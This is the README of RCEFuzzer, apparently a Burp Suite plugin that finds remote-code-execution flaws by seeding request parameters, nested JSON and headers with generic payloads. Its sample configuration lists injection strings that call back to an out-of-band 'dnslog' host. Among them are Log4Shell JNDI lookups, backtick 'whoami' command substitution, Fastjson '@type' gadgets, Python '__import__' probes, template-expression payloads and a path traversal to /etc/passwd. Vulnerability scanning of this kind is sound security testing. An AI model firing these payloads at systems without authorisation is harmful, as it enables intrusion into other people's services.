# RCEFuzzer


## 下载使用

[https://github.com/TheKingOfDuck/RCEFuzzer/releases/tag/0.5](https://github.com/TheKingOfDuck/RCEFuzzer/releases/tag/0.5)

## 基本介绍

这是一个以fuzz为中心思想的被动扫描工具(该版本是BURP插件,并非独立工具)，多数扫描器的工作逻辑是以已知漏洞去冲目标，然后根据条件判断是否存在这个已知的漏洞；rcefuzzer的工作逻辑是以通用payload去污染目标的参数，然后根据条件判断是否存在未知漏洞。

举个例子，假设被动收集到的流量是

https://www.baidu.com
```
POST /sys/customer/list HTTP/1.1
Host: www.baidu.com
Content-Length: 23
Content-Type: application/json;charset=UTF-8

{"key1":"value1","key2":"eyJpbm5lcmtleTEiOiJpbm5lcnZhbHVlMSJ9","id":1,"isLogin":false,"key3":{"innerkey2":"{\"k3\":\"v3\"}"}}
```
如果配置了三条通用的payload:
```
${jndi:ldap://dnslog/log4j}
`whoami`.dnslog
{"@type":"java.net.Inet4Address","val":"dnslog"}
```

那么rcefuzzer的参数污染模块将对目标发起以下请求：

* 污染key1的值然后分别发包
* 通用污染key1的值然后分别发包
* 尝试自动解码，并污染子JSON的innerkey1的值3次然后分别发包
* 污染key3的值然后分别发包。
* 污染子JSONinnerkey2的值，然后分别发包。
* 尝试解析innerkey2，并污染子JSON的k3的值然后分别发包

理论上总的请求量是3*6=18次。这仅是参数污染模块，如果带上其他模块，那请求量可能是50。如果payload写得多点，原流量大一点，那么可能是5000次。

## 配置说明

```

###
#
# 配置说明:
#    1.tweb的配置是必须要改的, 不改显示不了漏洞
#    2.白名单的优先级是高于黑名单的
#    3.所有配置都是可以动态改的, 不用重新加载插件
# 使用说明:
#    https://www.wolai.com/gS5UWgMmHG4ynJQgzL3AYk
###
config:
  version: |  # 插件版本
    0.5
  twebdomain: | # tweb 子域名配置
    xxx.xx.com
  twebapi: |  # tweb api配置 其中KEY为展位符,在新旧版本的tweb均可在Profile页面找到
    https://admin.xxxx.com/logs?token=xxxxxx&type=dns&q=KEY
  timeout: |  # 扫描过程中的超时配置 非tweb请求超时设置 单位毫秒 60000为60秒
    60000
  hostBlacklistReg: |  # 禁止扫描的域名列表
    (.+?)(gov\.cn|edu\.cn|tweb|google|gstatic)(.+?)
  extBlacklist: |  # 禁止扫描的后缀列表,这不是正则，本来想从passive-scan-client中抄代码的,结果发现他有bug...
    .js|.css|.jpeg|.gif|.jpg|.png|.pdf|.rar|.zip|.docx|.doc|.ico

jsonPollution:
  status:  #on为开启 off为关闭
    on
  allin: | #替换整个json数据包
    {"@type":"java.net.Inet4Address","val":"dnslog"}
  value: | #仅污染json的键值 为了python eval那种情况考虑 不加双引号包裹的话污染结果类似{"test":__import__('os')} {"test":"{\"dtaa\":__import__('os')}"}
    "${jndi:ldap://dnslog/jsonkey}"
    __import__('socket').gethostbyaddr('dnslog')

paramPollution:
  status: #on为开启 off为关闭
    on
  exprs: | #为了兼容有回显的表达式注入/代码执行漏洞
    {{9527*2333}}|22226491
    ${T(java.lang.System).getenv()}|JAVA_HOME
    ${T+++++++(java.lang.System).getenv()}|JAVA_HOME
    {php}var_dump(md5(9527));{/php}|52569c045dc348f12dfc4c85000ad832
    {if+var_dump(md5(9527))}{/if}|52569c045dc348f12dfc4c85000ad832
    ../../../../../../../../../../../../../../../etc/passwd|root
  value: |
    dnslog
    ${jndi:ldap://paramPollution.dnslog/log4j}
    `whoami`.dnslog
    http://dnslog/
    ping+-nc+1+dnslog

headerPollution:
  status: #on为开启 off为关闭
    on
  allin: | #一次性污染除了url和host外的所有请求头
    ${jndi:dns://dnslog/456}
    ${jndi:ldap://dnslog/789}
  headers: | #添加的请求头如果原数据包有则追加原值污染 无则添加后再发包 竖线|为key和value的分隔符号。
    X-Forwarded-For|${jndi:dns://dnslog/456}
    X-Api-Version|${jndi:dns://dnslog/456}

ssrfPollution:
  status: #on为开启 off为关闭
    on

responseMatch:
  status: #on为开启 off为关闭
    off
  expr: | #添加的请求头如果原数据包有则覆盖原值污染 无则添加后再发包
    thinkphp:error


```
